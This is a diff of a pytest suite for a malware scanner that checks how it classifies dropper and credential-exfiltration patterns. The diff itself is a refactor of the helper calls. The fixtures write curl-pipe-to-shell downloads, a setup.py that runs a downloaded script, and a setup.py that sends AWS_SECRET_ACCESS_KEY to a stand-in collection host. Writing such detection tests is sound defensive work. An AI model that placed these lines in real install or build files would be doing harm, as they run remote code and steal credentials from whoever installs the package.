@@ -24,19 +24,23 @@ import pytest
 
 from cordon_scanner import Scanner
 from cordon_scanner.core.models import Category
-from support import assemble
+from support import Support
 
-FETCH = assemble("cur", "l -fsSL https://cdn.example.invalid/")
+FETCH = Support.assemble("cur", "l -fsSL https://cdn.example.invalid/")
 """Split so this file does not read as a payload to Cordon's scan of itself.
 The tool gets no exception for its own test suite, which is the point."""
 
 
-def rules_for(root) -> set[str]:
-    return {
-        f.rule_id
-        for f in Scanner().scan(root).findings
-        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
-    }
+class CompositeScopeHelpers:
+    """Helpers for test_composite_scope.py."""
+
+    @staticmethod
+    def rules_for(root) -> set[str]:
+        return {
+            f.rule_id
+            for f in Scanner().scan(root).findings
+            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
+        }
 
 
 class TestDistanceIsPartOfTheClaim:
@@ -61,7 +65,7 @@ class TestDistanceIsPartOfTheClaim:
 
     def test_adjacent_fetch_and_execute_is_a_dropper(self, tmp_path) -> None:
         (tmp_path / "setup.py").write_text(f"{self.HEAD}{self.FETCH}{self.RUN}", encoding="utf-8")
-        assert rules_for(tmp_path) & self.DROPPER
+        assert CompositeScopeHelpers.rules_for(tmp_path) & self.DROPPER
 
     def test_the_same_two_lines_a_thousand_apart_are_not(self, tmp_path) -> None:
         """A build file is not one unit of behaviour. This is the shape that
@@ -70,7 +74,7 @@ class TestDistanceIsPartOfTheClaim:
         (tmp_path / "setup.py").write_text(
             f"{self.HEAD}{self.FETCH}{filler}{self.RUN}", encoding="utf-8"
         )
-        assert not rules_for(tmp_path) & self.DROPPER
+        assert not CompositeScopeHelpers.rules_for(tmp_path) & self.DROPPER
 
 
 class TestStartingAProcessIsNotRunningWhatYouDownloaded:
@@ -83,7 +87,7 @@ class TestStartingAProcessIsNotRunningWhatYouDownloaded:
             'echo "protection: $STATUS"\n',
             encoding="utf-8",
         )
-        found = rules_for(tmp_path)
+        found = CompositeScopeHelpers.rules_for(tmp_path)
         assert "SUSPECT.DROPPER.001" not in found
         assert "MALWARE.DROPPER.001" not in found
 
@@ -96,21 +100,23 @@ class TestStartingAProcessIsNotRunningWhatYouDownloaded:
         ],
     )
     def test_actually_running_it_still_is(self, tmp_path, template: str) -> None:
-        line = template.format(f=FETCH, x=assemble("E", "X"), y=assemble("Str", "ing"))
+        line = template.format(
+            f=FETCH, x=Support.assemble("E", "X"), y=Support.assemble("Str", "ing")
+        )
         (tmp_path / "install.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
-        assert "SUSPECT.DROPPER.001" in rules_for(tmp_path)
+        assert "SUSPECT.DROPPER.001" in CompositeScopeHelpers.rules_for(tmp_path)
 
     def test_an_interpreter_given_a_downloaded_string_is_execution(self, tmp_path) -> None:
         """`subprocess.run(["sh", "-c", downloaded])` labelled only as a
         process start, which is indistinguishable from running `git status`."""
-        fetch = assemble("urlop", "en")
+        fetch = Support.assemble("urlop", "en")
         (tmp_path / "setup.py").write_text(
             "import subprocess, urllib.request\n"
             f'script = urllib.request.{fetch}("https://cdn.example.invalid/i.sh").read()\n'
             'subprocess.run(["sh", "-c", script.decode()], check=False)\n',
             encoding="utf-8",
         )
-        assert "MALWARE.DROPPER.001" in rules_for(tmp_path)
+        assert "MALWARE.DROPPER.001" in CompositeScopeHelpers.rules_for(tmp_path)
 
 
 class TestCiIsNotAnInstallHook:
@@ -120,7 +126,7 @@ class TestCiIsNotAnInstallHook:
 
     SCRIPT = (
         "#!/bin/bash\n"
-        f"TOKEN=$(vault read -field={assemble('tok', 'en')} secret/ci/store)\n"
+        f"TOKEN=$(vault read -field={Support.assemble('tok', 'en')} secret/ci/store)\n"
         f'{FETCH.replace("-fsSL ", "-s -X POST ")}_doc" -H "Authorization: $TOKEN" -d @out.json\n'
     )
 
@@ -128,16 +134,16 @@ class TestCiIsNotAnInstallHook:
         target = tmp_path / ".buildkite" / "scripts" / "publish.sh"
         target.parent.mkdir(parents=True)
         target.write_text(self.SCRIPT, encoding="utf-8")
-        assert "MALWARE.EXFIL.001" not in rules_for(tmp_path)
+        assert "MALWARE.EXFIL.001" not in CompositeScopeHelpers.rules_for(tmp_path)
 
     def test_the_same_code_in_a_build_hook_is(self, tmp_path) -> None:
         (tmp_path / "setup.py").write_text(
             "import os, urllib.request\n"
-            f"token = os.environ[{assemble('AWS_SECRET', '_ACCESS_KEY')!r}]\n"
-            f'urllib.request.{assemble("urlop", "en")}("https://collect.example.invalid/?t=" + token)\n',
+            f"token = os.environ[{Support.assemble('AWS_SECRET', '_ACCESS_KEY')!r}]\n"
+            f'urllib.request.{Support.assemble("urlop", "en")}("https://collect.example.invalid/?t=" + token)\n',
             encoding="utf-8",
         )
-        assert "MALWARE.EXFIL.001" in rules_for(tmp_path)
+        assert "MALWARE.EXFIL.001" in CompositeScopeHelpers.rules_for(tmp_path)
 
     def test_a_pipeline_script_that_runs_what_it_downloaded_is_still_critical(
         self, tmp_path
@@ -148,7 +154,7 @@ class TestCiIsNotAnInstallHook:
         target = tmp_path / ".buildkite" / "scripts" / "bootstrap.sh"
         target.parent.mkdir(parents=True)
         target.write_text(f"#!/bin/bash\n{FETCH}i.sh | sh\n", encoding="utf-8")
-        assert "MALWARE.DROPPER.001" in rules_for(tmp_path)
+        assert "MALWARE.DROPPER.001" in CompositeScopeHelpers.rules_for(tmp_path)
 
     def test_a_workflow_that_pipes_a_download_into_a_shell_is_reported_too(self, tmp_path) -> None:
         """By the rule that reads pipeline definitions rather than by the
@@ -160,7 +166,7 @@ class TestCiIsNotAnInstallHook:
             f"jobs:\n  release:\n    steps:\n      - run: {FETCH}i.sh | sh\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.CI.FETCH_EXEC.001" in rules_for(tmp_path)
+        assert "SUSPECT.CI.FETCH_EXEC.001" in CompositeScopeHelpers.rules_for(tmp_path)
 
 
 class TestTheContextsAreDistinctInTheScanContext:
@@ -223,13 +229,13 @@ class TestAPinnedFetchIsNotEvidenceOfIntent:
     def test_an_unpinned_uploader_is_still_malicious(self, tmp_path) -> None:
         """The Codecov shape, which is what the rule is named for."""
         root = self.ci_script(tmp_path, f"{FETCH.replace('-fsSL ', '-s ')}bash | bash")
-        assert "MALWARE.DROPPER.001" in rules_for(root)
+        assert "MALWARE.DROPPER.001" in CompositeScopeHelpers.rules_for(root)
 
     def test_a_version_pinned_installer_is_suspicious_not_malicious(self, tmp_path) -> None:
         root = self.ci_script(
             tmp_path, f"{FETCH.replace('-fsSL ', '-o- ')}nvm-sh/nvm/v0.40.4/install.sh | bash"
         )
-        found = rules_for(root)
+        found = CompositeScopeHelpers.rules_for(root)
         assert "MALWARE.DROPPER.001" not in found, found
         assert "SUSPECT.DROPPER.001" in found, (
             "the file still fetches and runs something, which is worth reporting"
@@ -238,14 +244,14 @@ class TestAPinnedFetchIsNotEvidenceOfIntent:
     def test_a_commit_pinned_fetch_is_too(self, tmp_path) -> None:
         digest = "a" * 40
         root = self.ci_script(tmp_path, f"{FETCH}i.sh@{digest} | sh")
-        assert "MALWARE.DROPPER.001" not in rules_for(root)
+        assert "MALWARE.DROPPER.001" not in CompositeScopeHelpers.rules_for(root)
 
     def test_a_verified_fetch_is_too(self, tmp_path) -> None:
         root = self.ci_script(
             tmp_path,
             f'{FETCH}i.sh -o /tmp/i.sh\necho "abc123  /tmp/i.sh" | sha256sum -c -\nsh /tmp/i.sh',
         )
-        assert "MALWARE.DROPPER.001" not in rules_for(root)
+        assert "MALWARE.DROPPER.001" not in CompositeScopeHelpers.rules_for(root)
 
     def test_an_install_hook_keeps_the_category_whatever_it_fetches(self, tmp_path) -> None:
         """The asymmetry, and the reason it is not arbitrary: an install hook runs on
@@ -262,7 +268,7 @@ class TestAPinnedFetchIsNotEvidenceOfIntent:
             f"#!/bin/bash\n{FETCH.replace('-fsSL ', '-o- ')}nvm-sh/nvm/v0.40.4/install.sh | bash\n",
             encoding="utf-8",
         )
-        assert "MALWARE.DROPPER.001" in rules_for(tmp_path)
+        assert "MALWARE.DROPPER.001" in CompositeScopeHelpers.rules_for(tmp_path)
 
 
 class TestReadingOneNamedSettingIsNotCredentialAccess:
@@ -320,5 +326,5 @@ class TestReadingOneNamedSettingIsNotCredentialAccess:
             'def minimum = new URL("https://raw.githubusercontent.test/x/main/version").text\n',
             encoding="utf-8",
         )
-        found = rules_for(tmp_path)
+        found = CompositeScopeHelpers.rules_for(tmp_path)
         assert "MALWARE.EXFIL.001" not in found, found
